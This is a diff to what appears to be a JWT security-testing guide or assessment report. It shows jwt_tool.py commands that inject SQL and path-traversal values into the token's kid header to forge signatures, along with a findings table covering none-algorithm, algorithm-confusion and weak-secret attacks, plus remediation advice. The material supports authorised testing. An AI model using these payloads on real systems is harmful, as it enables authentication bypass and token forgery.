@@ -109,7 +109,7 @@ python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "' UNION SELECT 'secret-key' FROM
   -S hs256 -p "secret-key"
 
 # Path Traversal via kid
-python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../dev/null" \
+python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "dev/null" \
   -S hs256 -p ""
 
 # Kid pointing to empty file (sign with empty string)
@@ -209,7 +209,7 @@ python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "discovered_secret" \
 | 1 | None algorithm accepted | alg: "none" | Auth bypass | Critical |
 | 2 | Algorithm confusion | RS256 -> HS256 | Token forgery | Critical |
 | 3 | Weak HMAC secret | Brute-force: "secret123" | Full token forgery | Critical |
-| 4 | Kid path traversal | kid: "../../dev/null" | Sign with empty key | High |
+| 4 | Kid path traversal | kid: "dev/null" | Sign with empty key | High |
 
 ### Remediation
 - Enforce algorithm whitelist in JWT verification (reject "none")
